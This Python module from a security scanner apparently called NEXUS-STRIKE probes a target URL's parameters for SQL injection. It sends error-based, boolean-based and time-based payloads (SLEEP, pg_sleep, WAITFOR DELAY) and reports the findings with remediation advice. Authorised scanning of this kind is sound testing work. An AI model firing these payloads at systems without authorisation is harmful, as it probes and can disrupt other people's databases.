#!/usr/bin/env python3
"""
NEXUS-STRIKE — webapp.sqli
Domain: webapp
Advanced SQL Injection detection with error-based, boolean-based, and time-based techniques.
"""
from __future__ import annotations
from nexus.foundation.net import safe_urlopen

import re
import socket
import ssl
import time
import urllib.request
import urllib.parse
from typing import Any, Optional

from nexus.foundation.schema import (
    Finding,
    STATUS_COMPLETED,
    STATUS_FAILED,
    STATUS_NO_FINDINGS,
    tool_result,
)
from nexus.tools.registry import tool_registry
from nexus.foundation.ssl_config import get_ssl_context

ERROR_PAYLOADS = {
    "mysql": ["'", '"', "1' AND 1=1--", "1' AND 1=2--", "1' OR '1'='1", "1' UNION SELECT 1--", "1' UNION SELECT 1,2,3--"],
    "postgresql": ["'", "1' AND 1=1--", "1' AND 1=2--", "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--"],
    "mssql": ["'", "1' AND 1=1--", "1' AND 1=2--", "1' UNION SELECT @@version--"],
    "oracle": ["'", "1' AND 1=1--", "1' AND 1=2--", "1' UNION SELECT NULL FROM DUAL--"],
    "sqlite": ["'", "1' AND 1=1--", "1' AND 1=2--", "1' UNION SELECT NULL--"],
}

ERROR_PATTERNS = [
    (r"SQL syntax.*MySQL", "MySQL", "error"),
    (r"Warning.*mysql_.*", "MySQL", "error"),
    (r"MySQLSyntaxErrorException", "MySQL", "error"),
    (r"PostgreSQL.*ERROR", "PostgreSQL", "error"),
    (r"Warning.*\Wpg_\W", "PostgreSQL", "error"),
    (r"valid PostgreSQL result", "PostgreSQL", "error"),
    (r"Driver.*SQL\s*Server", "MSSQL", "error"),
    (r"OLE DB.*SQL\s*Server", "MSSQL", "error"),
    (r"SQL\s*Server[^<]+Driver", "MSSQL", "error"),
    (r"ORA-[0-9]{5}", "Oracle", "error"),
    (r"Oracle.*Driver", "Oracle", "error"),
    (r"quoted string not properly terminated", "Oracle", "error"),
    (r"SQLite/JDBCDriver", "SQLite", "error"),
    (r"SQLite\.Exception", "SQLite", "error"),
    (r"unrecognized token", "SQLite", "error"),
]

TIME_PAYLOADS = [
    ("MySQL", "1' AND SLEEP(3)--", 3),
    ("MySQL", "1' OR SLEEP(3)--", 3),
    ("PostgreSQL", "1' AND pg_sleep(3)--", 3),
    ("PostgreSQL", "1' OR pg_sleep(3)--", 3),
    ("MSSQL", "1' AND WAITFOR DELAY '0:0:3'--", 3),
    ("MSSQL", "1' OR WAITFOR DELAY '0:0:3'--", 3),
    ("Oracle", "1' AND DBMS_PIPE.RECEIVE_MESSAGE('x',3)--", 3),
    ("SQLite", "1' AND randomblob(300000000)--", 2),
]

BOOLEAN_PAYLOADS = [
    ("true", " OR 1=1--", " OR 1=2--"),
    ("true", " AND 1=1--", " AND 1=2--"),
    ("true", " OR 'a'='a", " OR 'a'='b"),
    ("true", " UNION SELECT '1', '2", None),
]


def _http_request(url: str, timeout: int = 10, method: str = "GET", data: bytes = None) -> dict:
    """Make HTTP request with timing and response details."""
    if not url.startswith(("http://", "https://")):
        url = f"http://{url}"
    try:
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "NEXUS-STRIKE/0.2.0 (SQLi Detector)"},
            method=method,
            data=data,
        )
        ctx = get_ssl_context(url, allow_insecure=True)
        t0 = time.time()
        resp = safe_urlopen(req, timeout=timeout, context=ctx)
        elapsed = round(time.time() - t0, 3)
        body = resp.read(65536).decode("utf-8", errors="replace")
        return {"status": resp.status, "headers": dict(resp.headers), "body": body, "time": elapsed, "error": None}
    except urllib.error.HTTPError as e:
        body = e.read(65536).decode("utf-8", errors="replace") if e.fp else ""
        return {"status": e.code, "headers": dict(e.headers), "body": body, "time": 0, "error": None}
    except Exception as e:
        return {"status": 0, "headers": {}, "body": "", "time": 0, "error": str(e)[:100]}


def run(
    target: str,
    max_params: int = 10,
    max_payloads: int = 50,
    timeout: int = 10,
    **kwargs: Any,
) -> dict:
    """Perform SQL injection testing against target.

    Parameters
    ----------
    target : str
        URL or hostname to test.
    max_params : int
        Maximum parameters to test.
    max_payloads : int
        Maximum payloads per parameter.
    timeout : int
        Request timeout in seconds.
    """
    if not target or not target.strip():
        return tool_result("webapp.sqli", target, status=STATUS_FAILED, error="Empty target")

    findings: list[Finding] = []
    tested_params: list[str] = []
    vuln_indicators: list[dict] = []

    url = target if "://" in target else f"http://{target}"
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    params = {k: v[0] if v else "" for k, v in params.items()}

    if not params:
        params = {"id": "1", "q": "test", "page": "1", "search": "test"}

    tested_params = list(params.keys())[:max_params]

    for param in tested_params:
        if len(vuln_indicators) >= max_payloads:
            break

        # Error-based testing
        for db_type, payloads in ERROR_PAYLOADS.items():
            for payload in payloads[:5]:
                test_url = _inject_url(url, param, payload)
                resp = _http_request(test_url, timeout)
                if resp["status"] and resp["status"] != 0:
                    for pattern, detected_db, _ in ERROR_PATTERNS:
                        if re.search(pattern, resp["body"], re.IGNORECASE):
                            vuln_indicators.append({"param": param, "type": "error", "db": detected_db, "payload": payload})
                            findings.append(Finding(
                                title=f"SQL Injection vulnerability on parameter '{param}'",
                                severity="high",
                                confidence="high",
                                affected_asset=url,
                                evidence=f"{detected_db} error detected via payload: {payload[:50]}",
                                remediation="Implement parameterized queries and input validation.",
                                tool="webapp.sqli",
                                references=["CWE-89", "OWASP-A03"],
                            ))
                            break
                    if any(v["param"] == param for v in vuln_indicators):
                        break

        # Boolean-based testing
        if not any(v["param"] == param for v in vuln_indicators):
            base_val = params[param]
            for btype, true_payload, false_payload in BOOLEAN_PAYLOADS:
                if false_payload is None:
                    continue
                url_true = _inject_url(url, param, true_payload)
                url_false = _inject_url(url, param, false_payload)
                r1 = _http_request(url_true, timeout)
                r2 = _http_request(url_false, timeout)
                if r1["status"] and r2["status"] and r1["status"] == r2["status"]:
                    body_diff = abs(len(r1.get("body", "")) - len(r2.get("body", "")))
                    if body_diff > 50:
                        vuln_indicators.append({"param": param, "type": "boolean", "diff": body_diff})
                        findings.append(Finding(
                            title=f"Boolean-based blind SQLi on parameter '{param}'",
                            severity="medium",
                            confidence="medium",
                            affected_asset=url,
                            evidence=f"Response difference: {body_diff} bytes between true/false payloads",
                            remediation="Implement parameterized queries and input validation.",
                            tool="webapp.sqli",
                            references=["CWE-89", "OWASP-A03"],
                        ))
                        break

        # Time-based testing
        if not any(v["param"] == param for v in vuln_indicators):
            for db_type, payload, delay in TIME_PAYLOADS[:3]:
                test_url = _inject_url(url, param, payload)
                t0 = time.time()
                resp = _http_request(test_url, timeout=delay + 5)
                elapsed = time.time() - t0
                if elapsed >= delay - 0.5:
                    vuln_indicators.append({"param": param, "type": "time", "db": db_type, "delay": elapsed})
                    findings.append(Finding(
                        title=f"Time-based SQLi on parameter '{param}'",
                        severity="high",
                        confidence="high",
                        affected_asset=url,
                        evidence=f"{db_type} time-based injection (delay: {elapsed:.1f}s)",
                        remediation="Implement parameterized queries and WAF rules.",
                        tool="webapp.sqli",
                        references=["CWE-89", "OWASP-A03"],
                    ))
                    break

    summary = f"SQLi testing completed: {len(vuln_indicators)} vulnerabilities found in {len(tested_params)} parameters"

    return tool_result(
        "webapp.sqli", target,
        status=STATUS_COMPLETED if vuln_indicators else STATUS_NO_FINDINGS,
        findings=findings,
        summary=summary,
        metadata={"vulnerabilities": vuln_indicators, "tested_params": tested_params},
    )


def _inject_url(target: str, param: str, payload: str) -> str:
    """Inject payload into URL parameter."""
    parsed = urllib.parse.urlparse(target)
    query = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
    query[param] = payload
    return urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(query)))


tool_registry.register("webapp.sqli", run, metadata={
    "name": "webapp.sqli",
    "domain": "webapp",
    "status": "completed",
    "description": "SQL Injection detection with error, boolean, and time-based techniques",
    "parameters": {
        "target": "Target URL or hostname to test",
        "max_params": "Maximum parameters to test (default: 10)",
        "max_payloads": "Maximum payloads per parameter (default: 50)",
        "timeout": "Request timeout in seconds (default: 10)",
    },
})